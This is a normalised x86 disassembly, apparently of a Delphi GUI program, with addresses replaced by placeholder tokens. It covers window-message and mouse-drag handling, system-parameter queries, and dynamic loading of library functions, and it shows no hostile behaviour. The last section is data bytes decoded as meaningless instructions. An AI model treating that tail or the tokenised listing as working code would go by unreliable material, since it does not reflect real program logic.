mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_443218
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov al [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_443218
pop ecx
mov eax ebx
call sub_441594
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_441594
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_443218
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_441594
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
call sub_421f04
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_4432a8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_441594
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_441118
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_441594
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_443218
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4432f8
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_4383e0
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4383e0
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_443374
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_441024
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_4410d0
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_441678
test eax eax
je r-xdata
mov eax esi
call sub_44109c
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44311c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_441948
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_441678
mov edx [ ebx + 0x20 ]
call sub_4415d0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_443374
pop ecx
sub_4433f4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_441080
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_441080
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_441678
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_4433f4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44311c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_441948
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_44127c
mov eax edi
call sub_44166c
test eax eax
je r-xdata
mov eax edi
call sub_441678
mov esi eax
mov eax esi
call sub_441594
push eax
mov eax esi
call sub_4410d0
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_44166c
call sub_441594
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_441594
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_4415bc
mov eax esi
call sub_441594
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4415bc
mov eax edi
call sub_441678
call sub_44160c
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_4410d0
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_4415bc
mov eax edi
call sub_44166c
call sub_44160c
mov bl 0x1
jmp r-xdata
sub_44352c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4418e0
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_412350
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4420d4
test eax eax
je r-xdata
push ebp
call sub_443374
pop ecx
push ebp
call sub_4433f4
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_4432f8
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_4435b4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_441160
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_441160
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4432a8
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4432a8
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_443644
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443a1c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4068a0
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_4420d4
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_443078
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4068a0
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4420d4
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_438584
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_443a23
lea eax [ ebp - 0x48 ]
call sub_403f90
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43f228
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_4372a0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_439740
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f90
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_44352c
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43dd58
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_44312c
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4068a0
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_4435b4
pop ecx
mov eax [ ebp - 0x4 ]
call sub_44312c
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4068a0
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4420d4
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_438960
jmp r-xdata
mov eax edi
call sub_454dc8
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4420d4
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_4383e0
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_438a40
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403fe4
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_443018
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4564c8
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43f228
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_4390e8
jmp r-xdata
sub_443a2c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_403564
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_443ba0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_443abc
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_443b78
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_443b20
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_443b50
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406994
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_443b78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_443aec
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_443ba0
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_443b04
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_443b20
pop ebx
retn
mov eax ebx
call sub_443b50
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_443c04
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_443d6a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_443e88
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_443e6c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_443e6c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_443f78
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403258
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403258
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403258
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403258
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f90
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403f90
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_444000
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_444178
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408a04
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403fe4
mov eax [ rw-data ]
call sub_404450
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408a04
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fe4
mov eax [ rw-data ]
call sub_404450
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_404450
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4139c0
mov [ rw-data ] eax
call sub_443c04
mov dl 0x1
mov eax [ r-xdata ]
call sub_443a2c
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455da4
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_456e88
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_458a70
mov ecx r-xdata
mov edx sub_435b50
mov eax [ r-xdata ]
call sub_413174
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44417f
lea eax [ ebp - 0x10 ]
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_4441e8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_444247
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44424e
retn
mov eax rw-data
call sub_40cb64
call sub_443f78
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404a0c
mov eax rw-data
call sub_403f90
mov eax rw-data
call sub_403f90
sub_444250
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4442d6
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4442dd
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_444000
mov eax [ r-xdata ]
call sub_412fe8
mov eax [ r-xdata ]
call sub_413088
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
sub_444524
stc
push ebx
push eax
call eax
dec esp
inc esp
add [ eax ] bl
dec ebp
inc esp
add [ edi + ecx * 2 ] bl
inc esp
add [ edi + ecx * 2 ] bh
inc esp
add [ ecx ] dl
push esp
inc ebx
jne r-xdata
inc eax
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080004 ] al
outsb
inc ebx
push 0x65676e61
add al 0x44
inc esp
add [ eax ] cl
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
dec esp
inc ebp
inc esp
add [ eax ] cl
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x59600006
inc esp
add [ eax ] bh
add [ eax ] al
push [ eax + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
push es
dec ecx
insd
popad
jae r-xdata
add [ eax - 0xfffbfcc ] dl
pushfd
xor al 0x40
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
adc [ ebx + eax * 2 + 0x75 ] edx
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
inc edi
inc esp
add [ eax ] dh
add [ eax ] al
add [ eax + 0x18 ] ah
inc ecx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
arpl [ ebp + 0x74 ] si
ror [ gs : esi ] 0x41
add [ eax ] ah
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d0006 ] al
outsb
push ebx
je r-xdata
add bh bh
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090005 ] al
outsb
inc ebp
js r-xdata
inc esp
inc esp
add [ eax ] bl
add bh bh
pop esp
dec edi
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74617453
ror [ gs : esi ] 0x41
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 + 0x4da40041 ] bl
inc esp
add [ ebp + edx * 4 - 0x695bffbf ] ch
inc ecx
add al ch
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc ecx
add [ esp + ecx * 2 ] dl
inc esp
add [ eax ] ch
dec esi
inc esp
add [ ebp + ecx * 2 + 0x44 ] ah
add [ ebx ] cl
push esp
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
pop es
or edx [ ecx + eax * 2 + 0x63 ]
je r-xdata
outsd
insd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul esi [ ebx + 0x74 ] r-xdata
je r-xdata
add [ edx + esi ] cl
inc ebx
jne r-xdata
add [ eax - 0x63ffbfcc ] bl
je r-xdata
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x3400444c ] al
inc ecx
add ah al
xchg esp eax
inc ecx
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
inc ebp
inc esp
add [ eax ] ch
add [ eax ] al
pushfd
inc esp
inc esp
add al dl
cwde
inc ecx
add [ esp + esi - 0x6defffc0 ] dl
inc ecx
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
inc ecx
add [ edx ] al
add [ eax ] cl
inc ecx
arpl [ esi + ebp * 2 + 0x4c ] si
imul esi [ ebx + 0x74 ] 0x45c40000
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + eax * 2 ] cl
add [ eax ] al
xchg esp eax
adc [ eax ] al
jl r-xdata
inc eax
add [ eax + 0x51 ] cl
inc esp
add [ eax - 0x3bffbbaf ] bl
xchg esp eax
inc ecx
add [ eax + 0x3d ] dl
inc ecx
add [ ebp + edx * 4 - 0x64f3ffbf ] bl
dec esp
